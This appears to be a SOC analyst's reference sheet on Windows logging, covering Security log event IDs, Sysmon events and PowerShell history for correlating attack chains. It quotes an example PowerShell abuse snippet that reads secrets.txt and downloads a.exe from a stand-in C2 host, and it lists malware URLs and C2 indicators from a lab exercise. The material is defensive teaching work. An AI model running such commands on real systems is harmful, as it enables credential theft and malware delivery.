# 🛡️ Windows Security Monitoring — Windows Logging for SOC — Reference Sheet

> **TL;DR:** Windows logs are the SOC analyst's primary source for detecting threats. The two highest-value sources are the **Security log** (authentication 4624/4625, user management 4720/4732, etc.) and **Sysmon** (process creation, file/registry, network, DNS). The core investigative workflow is correlation: tie events together by **Logon ID** (Security logs) and **Process ID** (Sysmon) to reconstruct the full attack chain — from initial logon → process execution → file drop → C2 connection → DNS resolution.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| Timestamps are system time, NOT UTC | Event Viewer shows the system's local time, not UTC. Account for timezone when building a timeline. |
| 4624/4625 are logged on the *target* | Logon events appear on the machine being accessed, not the source machine. |
| 4625 logs are "inconsistent" | Failed logon logs have many caveats that can mislead you into the wrong interpretation. |
| Modern RDP shows Logon Type 3, not 10 | With NLA enabled (default), an RDP logon is preceded by a Type 3 event; the real Workstation Name is in that preceding Type 3 event. |
| 4688 (Process Creation) is disabled by default | You must manually enable it. Sysmon Event ID 1 is the richer, preferred alternative. |
| Sysmon is not installed by default | It's an external Sysinternals tool. Logs live under `Applications & Services → Microsoft → Windows → Sysmon → Operational`. |
| Sysmon ≠ Security log location | Sysmon logs are NOT in the Security log; they are in their own Operational channel. |
| PowerShell hides commands from Sysmon ID 1 | One `powershell.exe` session runs hundreds of commands without new processes, so Sysmon ID 1 only shows the launch — use the PS history file instead. |
| PS history file does NOT log output or script content | It records typed commands only — not command results, and not the contents of `.ps1` scripts run via `powershell .\script.ps1`. |
| PS history is per-user | Each user has their own `ConsoleHost_history.txt` — always check OTHER users' histories too (flags often hide there). |
| PID is reused / not unique over time | PIDs get recycled and change on reboot. Never identify a process by PID alone — always pair it with name, PPID, command line, user, and start time. |
| Some Sysmon events lack Logon ID / parent info | For events like 11/13/3/22, pivot via the **ProcessId** back to Event ID 1 to get full context. |
| Over 500 Security event IDs exist | Not all events are logged by default and not all are well documented — focus on the high-value ones. |

## 📂 Task 2 — What Is Logged

| Concept | Detail |
|---|---|
| Log | A single recorded event (time, action details, user). |
| Log storage | Binary `.evtx` files in `C:\Windows\System32\winevt\Logs`. |
| Application Logs | Events from user-mode apps (IIS, MS SQL). |
| Security Logs | Logon attempts, process activity, user management. |
| Tool used | **Event Viewer** (`Win + R` → `eventvwr`). |

**Why logging matters for SOC:** Incident Response (when/how attack occurred), Threat Hunting (search for malicious activity), Alerting & Triage (building block of detection rules).

| Event Viewer Field | Meaning |
|---|---|
| Keywords | Indicates if the action succeeded/failed (for some events). |
| Date and Time | Timestamp — **system time, not UTC**. |
| Event ID | Unique number for the event name (e.g. failed login = always **4625**). |
| Log Details | Actual log content (plaintext or XML "Details" tab). |
| Filters Menu | "Filter Current Log" and "Find" buttons. |

## 🔑 Task 3 — Security Log: Authentication

| Event ID | Purpose | Logging | Limitation |
|---|---|---|---|
| **4624** (Successful Logon) | Detect suspicious RDP/network logins, identify attack start point | On target machine | Noisy — hundreds/min on loaded servers |
| **4625** (Failed Logon) | Detect brute force, password spraying, vuln scanning | On target machine | Inconsistent — many misleading caveats |

### Logon Types (key field in 4624/4625)

| Type | Name | Typical scenario |
|---|---|---|
| 2 | Interactive | Console logon with keyboard/mouse (local/domain). |
| 3 | Network | Access to shared resource over network (SMB, file share, printer). |
| 4 | Batch | Scheduled task / batch job. |
| 5 | Service | Windows service starts under a service account. |
| 7 | Unlock | User unlocks a locked workstation. |
| 8 | NetworkCleartext | Network logon with cleartext creds (e.g. some IIS/HTTP auth). |
| 9 | NewCredentials | RunAs / mapped drive with alternate creds. |
| 10 | RemoteInteractive | RDP / Terminal Services / Remote Assistance. |
| 11 | CachedInteractive | Cached domain creds when DC unreachable (e.g. laptop). |

### Workflow: Detect RDP Brute Force

| Step | Action |
|---|---|
| 1 | Filter Security logs for **4625** (failed logins). |
| 2 | Look for Logon Type **3** (NLA default) and **10** (older/misconfigured). |
| 3 | Red flags below ↓ |

**Red flags:** many attempted usernames (admin, helpdesk, cctv → password spraying); many failures on one account, usually Administrator (brute force); Workstation Name off-pattern (e.g. `kali`); unexpected Source IP.

### Workflow: Analyse RDP Logons

| Step | Action |
|---|---|
| 1 | Filter Security logs for **4624** (successful logins). |
| 2 | Look for Logon Type **10** (RDP). |
| 3 | With NLA on, the Type 10 event is preceded by a Type 3 event — check it for the real Workstation Name. |
| 4 | Red flags: preceding brute force, suspicious source IP/hostname. |
| 5 | Save the **Logon ID** (e.g. `0x5D6AC`) — unique session identifier for correlation. |

## 👤 Task 4 — Security Log: User Management

| Event ID | Description | Malicious Usage |
|---|---|---|
| 4720 / 4722 / 4738 | User created / enabled / changed | Create backdoor account or enable an old one to evade detection. |
| 4725 / 4726 | User disabled / deleted | Disable privileged SOC accounts to slow defenders. |
| 4723 / 4724 | Password changed by user / reset | Reset password then access the target user. |
| 4732 / 4733 | Added to / removed from a security group | Add backdoor account to privileged groups (e.g. Administrators). |

### Structure of User Management Events

| Part | Meaning |
|---|---|
| Subject | Account performing the action. **Note the Logon ID** — correlates to the preceding 4624. |
| Object | Target of the action (named "New Account" or "Member" depending on event ID). |
| Details | Target group (4732/4733) or new user attributes (4720). |

### Workflow: Hunt for Backdoored Users

| Step | Action |
|---|---|
| 1 | Filter Security logs for **4720 / 4732**. |
| 2 | Review every event. |
| 3 | If malicious, copy the Logon ID → find matching 4624 → continue analysis. |

**Red flags:** no IT confirmation; changes during non-working hours/weekends; unknown subject user (e.g. `adm.old.2008`); target user off-pattern (e.g. `backup` instead of `thm_svc_backup`).

## ⚙️ Task 5 — Sysmon: Process Monitoring

| Event Code | Purpose | Limitation |
|---|---|---|
| **4688** (Security: Process Creation) | Log every new process + command line + parent | Disabled by default; must enable manually. |
| **Sysmon ID 1** (Process Creation) | Replaces 4688; adds process hash, signature, PE metadata | Sysmon not installed by default. |

**Sysmon location:** `Applications & Services → Microsoft → Windows → Sysmon → Operational`

### Sysmon Event ID 1 — Key Field Groups

| Group | Fields |
|---|---|
| Process Info | PID, Image (path), Command Line. |
| Parent Info | Parent process — build process tree / attack chain. |
| Binary Info | Hash (MD5/SHA256), signature, PE metadata. |
| User Context | User + **Logon ID** (same as Security logs). |

### Workflow: Analyse Process Launch

| Step | Action |
|---|---|
| 1 | Filter Sysmon for **Event ID 1**. |
| 2 | Check process/binary info red flags ↓ |
| 3 | Check parent process red flags ↓ |
| 4 | Walk up the tree: find event where `ProcessId == ParentProcessId`. |
| 5 | Trace chain by filtering all Security + Sysmon events with same **Logon ID**. |

**Process red flags:** image in uncommon dir (`C:\Temp`, `C:\Users\Public`); odd name (`aa.exe`, `jqyvpqldou.exe`); hash matches malware on VirusTotal.
**Parent red flags:** parent matches red flags above; unexpected parent (e.g. Notepad launching CMD).

## 🌐 Task 6 — Sysmon: Files and Network

| Event ID | Security Log Alternative | Purpose |
|---|---|---|
| 11 / 13 (File Create / Registry Value Set) | 4656 (file) / 4657 (registry) — both disabled by default | Detect dropped files or registry persistence. |
| 3 / 22 (Network Connection / DNS Query) | No direct alternative (needs firewall/DNS config) | Detect traffic from untrusted processes or to malicious destinations. |

### Sysmon Event ID Cheat Map

| ID | Meaning (実行/通信/作成) |
|---|---|
| 1 | Process execution (実行) — get the PID here |
| 3 | Network connection (通信) — DestinationIp:DestinationPort |
| 11 | File create (ファイル作成) — TargetFilename |
| 13 | Registry value set (レジストリ変更) |
| 15 | FileCreateStreamHash (ダウンロード元/ADS) — HostUrl in Contents |
| 22 | DNS query — QueryName / QueryResults / QueryStatus |

### Workflow: Analyse Process Activities (correlation by ProcessId)

| Step | Action |
|---|---|
| 1 | Copy **ProcessId** from Event ID 1. |
| 2 | Search other Sysmon events with the same ProcessId. |
| 3 | Network red flags ↓ |
| 4 | File/registry red flags ↓ |

**Network red flags:** connection to external IP on port 80 or non-standard ports (e.g. 4444); known-malicious IPs; suspicious DNS (`*.top`, `*.click`, random domains).
**File/registry red flags:** files dropped to `C:\Temp` or `C:\Users\Public`; dropped script (`.bat`/`.ps1`) or executable (`.exe`/`.com`); created keys/files used for persistence.

### 🔁 Standard File-Attack Investigation Flow

| Order | Event ID | What it gives you |
|---|---|---|
| 1 | **15** | Origin of file (download URL via HostUrl/Zone.Identifier) |
| 2 | **1** | Execution confirmation + ProcessId |
| 3 | **11** | Files created (persistence location) |
| 4 | **13** | Registry persistence |
| 5 | **3 / 22** | C2 destination + domain |

**Worked example (this room):**
- ID 15 → `ckjg.exe` downloaded from `http://gettsveriff.com/bgj3/ckjg.exe`
- ID 1 → `ckjg.exe` ran as **ProcessId 1460**
- ID 11 → created `...\Startup\DeleteApp.url` (Startup folder = auto-run on logon = **persistence**)
- ID 3 → C2 at `193.46.217.4:7777`
- ID 22 → domain `hkfasfsafg.click` (match via QueryResults to the C2 IP)

## 💻 Task 7 — PowerShell: Logging Commands

| Concept | Detail |
|---|---|
| Why Sysmon ID 1 isn't enough | One session runs many commands without spawning new processes — only the launch is logged. |
| PS history file | Plain-text file logging every typed command, updated on Enter. |
| Path | `C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| Other monitoring methods | AMSI, Transcript Logging (5 methods total — see Logless Hunt room). |

**Key notes:** great for tracking discovery/download; created per-user (5 users = 5 files); survives reboots; saves all commands for all time; does NOT log output or script content.

### Why PowerShell is abused

Trusted + capable: malware download, system discovery, data exfiltration, even process injection.

### Example abuse commands (from room)

```powershell
Get-ChildItem
Get-Content secrets.txt
Get-LocalUser; Get-LocalGroup
Invoke-WebRequest http://c2server.thm/a.exe -OutPath C:\Temp\a.exe
# Read sensitive file, enumerate users/groups, download malware to Temp
# All within ONE powershell.exe process → invisible to Sysmon ID 1 detail
```

### Useful pivot commands (PID forensics)

```bash
# Linux PID investigation
ps -ef                      # full process listing
ps -fp <PID>                # details for one PID
pstree -p                   # process tree with PIDs
lsof -p <PID>               # open files/sockets for a PID
cat /proc/<PID>/cmdline     # command line of a PID
ls -l /proc/<PID>/exe       # actual executable path
```

```cmd
netstat -ano                # map connections to PIDs (Windows)
# e.g. 192.168.1.10:49822 -> 185.10.10.10:443  PID 4240
# then look up PID 4240 in Sysmon ID 1 to find the real process + parent
```

### Notable PID values (low memorization priority)

| PID | Process | Note |
|---|---|---|
| 0 | Idle | No real process. |
| 4 | System | Near-fixed in most environments. |
| 1 (Linux) | init / systemd | Critical — orphan-process parent. |
| else | Variable | Context > number; don't memorize. |

## 🎯 Key Takeaways

| Takeaway | Detail |
|---|---|
| Know 4624 / 4625 | You'll encounter them constantly in SOC triage. |
| Group by Logon ID and Process ID | Fastest way to reconstruct the attack chain. |
| Learn and use Sysmon | Gives the most context about what's happening. |
| Don't forget PowerShell logging | Its abuse grows every year — use the history file. |
| PID is a handle, not an identity | Always pivot: PID → PPID → Process Tree → CommandLine → User → timeline. |
